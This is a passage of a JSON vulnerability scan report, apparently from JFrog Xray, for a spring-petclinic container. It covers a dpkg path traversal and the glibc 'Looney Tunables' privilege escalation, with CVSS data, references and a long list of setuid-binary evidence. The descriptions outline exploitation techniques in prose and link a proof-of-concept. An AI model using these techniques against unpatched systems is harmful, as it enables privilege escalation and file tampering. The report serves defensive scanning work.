{
   "total_count": 124,
   "data": [
      {
         "id": "XRAY-210934",
         "severity": "Critical",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "Dpkg::Source::Archive in dpkg, the Debian package management system, before version 1.21.8, 1.20.10, 1.19.8, 1.18.26 is prone to a directory traversal vulnerability. When extracting untrusted source packages in v2 and v3 source package formats that include a debian.tar, the in-place extraction can lead to directory traversal situations on specially crafted orig.tar and debian.tar tarballs.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:dpkg",
         "source_id": "deb://debian:bullseye:dpkg",
         "source_comp_id": "deb://debian:bullseye:dpkg:1.20.9",
         "component_versions": {
            "id": "debian:bullseye:dpkg",
            "vulnerable_versions": [
               "< 1.20.10"
            ],
            "fixed_versions": [
               "1.20.10"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-1664",
                     "cwe": [
                        "CWE-22"
                     ],
                     "cwe_details": {
                        "CWE-22": {
                           "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
                           "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "8"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "7.5/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P",
                     "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "Dpkg::Source::Archive in dpkg, the Debian package management system, before version 1.21.8, 1.20.10, 1.19.8, 1.18.26 is prone to a directory traversal vulnerability. When extracting untrusted source packages in v2 and v3 source package formats that include a debian.tar, the in-place extraction can lead to directory traversal situations on specially crafted orig.tar and debian.tar tarballs.",
               "provider": "JFrog"
            }
         },
         "edited": "2022-09-04T15:24:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-210934",
            "VulnerabilityTitle": "",
            "ShortDescription": "Improper limitation of a pathname to a restricted directory in dpkg leads to arbitrary file overwrite when extracting a crafted package.",
            "FullDescription": "dpkg, also known as Debian package management system, is the software at the base of the package management system in the free operating system Debian and its numerous derivatives. dpkg is used to install, remove, and provide information about .deb packages.\n\ndpkg packages containing a debian.tar tarball in it are processed differently by the extraction mechanism, as it uses the GNU tar to extract. GNU tar replaces entries on the filesystem by the entries present on the tarball, but it will follow symlinks when the symlink pathname itself is not present as an actual directory on the tarball.\n\nA symlink (also called a symbolic link) is a type of file in Linux that points to another file or a folder on your computer.\n\nThis means we can create a package with two tarballs: \n\n* A first one named `debian.tar` (it has to be this name) containing an entry within that symlink as if it was a directory. The directory entry for the symlink pathname itself should not exist so that the tar will be extracted following the symlink outside the source tree root.\n- A second tarball `orig.tar` where there's a symlink pointing out of the source tree root directory. Thus, the extraction process will get out of the actual directory which can lead to file overwrite wherever the symlink point on the filesystem.\n\nThis vulnerability leads to a directory traversal situation which can cause arbitrary file overwrite on the filesystem. \n\nWhile an attacker can exploit this vulnerability for overwriting arbitrary files, the actual applicability of the vulnerability exists only when a package is being extracted by dpkg and not when it is installed by dpkg. That is because the installation of an attacker-controlled package will anyway give the attacker the possibility of executing code in most cases, which is more powerful than overwriting arbitrary files.\n\nAn example of extraction of a pacakge with dpkg:\n`dpkg-deb -x package-to-extract.deb /path/where/to/extract/`",
            "Impact": 5,
            "VulnerabilityType": "Arbitrary File Overwrite",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "By exploiting this vulnerability an attacker could replace arbitrary files, including critical system files when the extraction is executed in high privileges.",
                  "IsPositive": 0,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "Even though extraction is part of the dpkg installation process, this vulnerability is only applicable when extracting a package without installing it because installing an untrusted package is a severe security issue in itself as it installs the attacker's malicious package with highest privileges and so, does not require this arbitrary file write vulnerability at all. \nThus, as dpkg is used to install packages in most cases, extracting a package without installing it is rare.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "Requires the user to extract the package through dpkg or a server code to extract packages using dpkg.\nExample: `dpkg-deb -x package-to-extract.deb /path/where/to/extract/it/`",
                  "IsPositive": 1,
                  "InsertOrder": 2
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Advisory",
                  "Url": "https://git.dpkg.org/cgit/dpkg/dpkg.git/commit/?id=1f23dddc17f69c9598477098c7fb9936e15fa495",
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://git.dpkg.org/cgit/dpkg/dpkg.git/commit/?id=faa4c92debe45412bfcf8a44f26e827800bb24be",
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://git.dpkg.org/cgit/dpkg/dpkg.git/commit/?id=1f23dddc17f69c9598477098c7fb9936e15fa495",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://git.dpkg.org/cgit/dpkg/dpkg.git/commit/?id=7a6c03cb34d4a09f35df2f10779cbf1b70a5200b",
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://git.dpkg.org/cgit/dpkg/dpkg.git/commit/?id=58814cacee39c4ce9e2cd0e3a3b9b57ad437eff5",
                  "InsertOrder": 5
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": true,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:dpkg:1.20.9",
            "cve_id": "CVE-2022-1664",
            "scan_status": 1,
            "applicability": true,
            "evidence": [
               {
                  "column_names": [
                     "Path",
                     "Evidence",
                     "Line Number",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/config/config.json",
                        "--extract",
                        "57",
                        "Vulnerable use of dpkg/dpkg-deb/dpkg-source is found since a vulnerable flag is used"
                     ]
                  ]
               }
            ],
            "info": "Vulnerable use of dpkg/dpkg-deb/dpkg-source is found since a vulnerable flag is used",
            "details": [
               {
                  "file_path": "/config/config.json",
                  "details": "Evidence: --extract, Line Number: 57, Issue Found: Vulnerable use of dpkg/dpkg-deb/dpkg-source is found since a vulnerable flag is used"
               }
            ]
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:dpkg:1.20.9",
            "vulnerability_id": "CVE-2022-1664",
            "result": "applicable"
         }
      },
      {
         "id": "XRAY-532786",
         "severity": "High",
         "jfrog_severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "A buffer overflow was discovered in the GNU C Library's dynamic loader ld.so while processing the GLIBC_TUNABLES environment variable. This issue could allow a local attacker to use maliciously crafted GLIBC_TUNABLES environment variables when launching binaries with SUID permission to execute code with elevated privileges.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libc-bin",
         "source_id": "deb://debian:bullseye:libc-bin",
         "source_comp_id": "deb://debian:bullseye:libc6:2.31-13+deb11u3",
         "component_versions": {
            "id": "debian:bullseye:glibc",
            "vulnerable_versions": [
               "< 2.31-13+deb11u7"
            ],
            "fixed_versions": [
               "2.31-13+deb11u7"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-4911",
                     "cwe": [
                        "CWE-787"
                     ],
                     "cwe_details": {
                        "CWE-787": {
                           "name": "Out-of-bounds Write",
                           "description": "The product writes data past the end, or before the beginning, of the intended buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "1"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "7.8/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "A buffer overflow was discovered in the GNU C Library's dynamic loader ld.so while processing the GLIBC_TUNABLES environment variable. This issue could allow a local attacker to use maliciously crafted GLIBC_TUNABLES environment variables when launching binaries with SUID permission to execute code with elevated privileges.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-532786",
            "VulnerabilityTitle": "",
            "ShortDescription": "A buffer overflow in glibc may lead to local privilege escalation when parsing a malicious environment variable.",
            "FullDescription": "At the beginning of its execution, ld.so is responsible for loading GLIBC_TUNABLES environment variables. A notable issue emerges when a GLIBC_TUNABLES variable adopts the format \"tunable1=tunable2=AAA\", and both \"tunable1\" and \"tunable2\" are SXID_IGNORE tunables. This particular scenario can lead to a buffer overflow in the copied GLIBC_TUNABLES variable. Utilizing this buffer overflow vulnerability, an attacker gains the ability to overwrite the pointer that directs the dynamic loader to its library search path. This pointer is critical in determining where the dynamic loader locates essential libraries. By manipulating this pointer, the attacker redirects the dynamic loader to load a malicious libc.so library situated in a location controlled by them. This malicious library may execute harmful code, ultimately facilitating an escalation of privileges.",
            "Impact": 6,
            "VulnerabilityType": "Local privilege escalation",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can only be exploited by an attacker that can execute code on the vulnerable machine (excluding exceedingly rare circumstances)",
                  "Description": "This vulnerability requires local access to exploit.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "This vulnerability has several published exploits with an extensive technical write-up. The Proof-of-concept has been demonstrated to lead to full root privileges on major Linux distributions: Ubuntu, Fedora, and Debian.",
                  "IsPositive": 0,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has multiple mentions in general media",
                  "Description": "The vulnerability received extensive media coverage and was nicknamed `Looney Tunables`.",
                  "IsPositive": 0,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
                  "Description": "The requirements to trigger the vulnerability are highly likely on default Linux machines.",
                  "IsPositive": 0,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The vulnerability requires the following to be exploited:\n1. `GLIBC_TUNABLES` environment variable being enabled, which is enabled by default.\n2. The `ld.so` binary (the dynamic loader) must have SUID permissions, which is common on Linux.",
                  "IsPositive": 1,
                  "InsertOrder": 5
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Advisory",
                  "Url": "https://www.qualys.com/2023/10/03/cve-2023-4911/looney-tunables-local-privilege-escalation-glibc-ld-so.txt",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "Proof-of-concept",
                  "Url": "https://github.com/leesh3288/CVE-2023-4911",
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Technical Writeup",
                  "Title": "Technical writeup",
                  "Url": "https://www.qualys.com/2023/10/03/cve-2023-4911/looney-tunables-local-privilege-escalation-glibc-ld-so.txt",
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://sourceware.org/git/?p=glibc.git;a=commit;h=1056e5b4c3f2d90ed2b4a55f96add28da2f4c8fa",
                  "InsertOrder": 4
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": true,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libc6:2.31-13+deb11u3",
            "cve_id": "CVE-2023-4911",
            "scan_status": 1,
            "applicability": true,
            "evidence": [
               {
                  "column_names": [
                     "Path",
                     "Offset",
                     "Symbol",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/bin/mount",
                        "0x00000000",
                        "__cxa_finalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000db40",
                        "mnt_table_set_parser_errcb",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000db48",
                        "mnt_context_get_fs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000db50",
                        "mnt_fs_get_source",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000db58",
                        "mnt_context_set_source",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000db60",
                        "__snprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000db68",
                        "mnt_context_is_restricted",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000db70",
                        "free",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000db78",
                        "mnt_unref_table",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000db80",
                        "mnt_fs_get_fstype",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000db88",
                        "mnt_context_mount",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000db90",
                        "__errno_location",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000db98",
                        "mnt_context_helper_executed",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dba0",
                        "strncpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dba8",
                        "strncmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dbb0",
                        "_exit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dbb8",
                        "secure_getenv",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dbc0",
                        "mnt_fs_set_target",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dbc8",
                        "mnt_context_enable_fake",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dbd0",
                        "warn",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dbd8",
                        "ferror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dbe0",
                        "mnt_context_set_fstype",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dbe8",
                        "mnt_context_is_fork",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dbf0",
                        "strtod",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dbf8",
                        "mnt_table_next_fs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc00",
                        "localeconv",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc08",
                        "write",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc10",
                        "textdomain",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc18",
                        "mnt_new_iter",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc20",
                        "mnt_context_get_cache",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc28",
                        "mnt_context_set_target_prefix",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc30",
                        "mnt_context_disable_swapmatch",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc38",
                        "__strtol_internal",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc40",
                        "fclose",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc48",
                        "bindtextdomain",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc50",
                        "dcgettext",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc58",
                        "strlen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc60",
                        "mnt_get_library_features",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc68",
                        "__stack_chk_fail",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc70",
                        "mnt_cache_find_tag_value",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc78",
                        "getuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc80",
                        "getopt_long",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc88",
                        "errx",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc90",
                        "strchr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc98",
                        "warnx",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dca0",
                        "mnt_context_force_unrestricted",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dca8",
                        "nanosleep",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dcb0",
                        "strrchr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dcb8",
                        "mnt_new_table",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dcc0",
                        "mnt_context_next_mount",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dcc8",
                        "mnt_optstr_remove_option",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dcd0",
                        "dup",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dcd8",
                        "mnt_context_enable_rwonly_mount",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dce0",
                        "__assert_fail",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dce8",
                        "fputs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dcf0",
                        "__strtoul_internal",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dcf8",
                        "mnt_context_wait_for_children",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd00",
                        "memset",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd08",
                        "mnt_context_disable_helpers",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd10",
                        "geteuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd18",
                        "getcwd",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd20",
                        "mnt_context_get_options",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd28",
                        "fgetc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd30",
                        "close",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd38",
                        "mnt_context_set_tables_errcb",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd40",
                        "pipe",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd48",
                        "strspn",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd50",
                        "mnt_new_context",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd58",
                        "mnt_context_next_remount",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd60",
                        "fputc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd68",
                        "strcspn",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd70",
                        "read",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd78",
                        "strndup",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd80",
                        "fgets",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd88",
                        "mnt_fs_get_target",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd90",
                        "mnt_match_fstype",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd98",
                        "strcmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dda0",
                        "mnt_context_set_fstab",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dda8",
                        "strtol",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000ddb0",
                        "mnt_fs_get_srcpath",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000ddb8",
                        "realpath",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000ddc0",
                        "memcpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000ddc8",
                        "mnt_context_is_nocanonicalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000ddd0",
                        "prctl",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000ddd8",
                        "fileno",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dde0",
                        "getgid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dde8",
                        "mnt_context_enable_fork",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000ddf0",
                        "__xstat",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000ddf8",
                        "mnt_init_debug",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de00",
                        "mnt_context_syscall_called",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de08",
                        "err",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de10",
                        "mnt_context_set_target",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de18",
                        "malloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de20",
                        "fflush",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de28",
                        "mnt_new_cache",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de30",
                        "mnt_context_get_target",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de38",
                        "mnt_fs_is_pseudofs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de40",
                        "mnt_context_get_excode",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de48",
                        "__vasprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de50",
                        "mnt_free_iter",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de58",
                        "mnt_context_is_verbose",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de60",
                        "mnt_context_set_target_ns",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de68",
                        "mnt_unref_cache",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de70",
                        "mnt_fs_is_netfs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de78",
                        "getegid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de80",
                        "mnt_optstr_get_option",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de88",
                        "mnt_context_enable_sloppy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de90",
                        "mnt_table_set_cache",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de98",
                        "mnt_context_set_mflags",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dea0",
                        "setlocale",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dea8",
                        "__printf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000deb0",
                        "mnt_context_get_mtab",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000deb8",
                        "mnt_context_get_source",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dec0",
                        "mnt_get_library_version",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dec8",
                        "memmove",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000ded0",
                        "mnt_context_is_parent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000ded8",
                        "setgid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dee0",
                        "waitpid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dee8",
                        "access",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000def0",
                        "fopen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000def8",
                        "mnt_pretty_path",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df00",
                        "mnt_context_set_options_pattern",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df08",
                        "mnt_free_context",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df10",
                        "mnt_context_disable_canonicalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df18",
                        "strtoul",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df20",
                        "mnt_context_set_fstype_pattern",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df28",
                        "__cxa_atexit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df30",
                        "mnt_context_append_options",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df38",
                        "exit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df40",
                        "mnt_context_get_mflags",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df48",
                        "fwrite",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df50",
                        "__fprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df58",
                        "mnt_context_enable_verbose",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df60",
                        "mnt_context_set_optsmode",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df68",
                        "mnt_fs_get_options",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df70",
                        "setuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df78",
                        "mnt_table_parse_fstab",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df80",
                        "mnt_context_disable_mtab",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df88",
                        "strdup",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df90",
                        "mnt_tag_is_valid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df98",
                        "fork",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dfa0",
                        "mnt_fs_set_source",
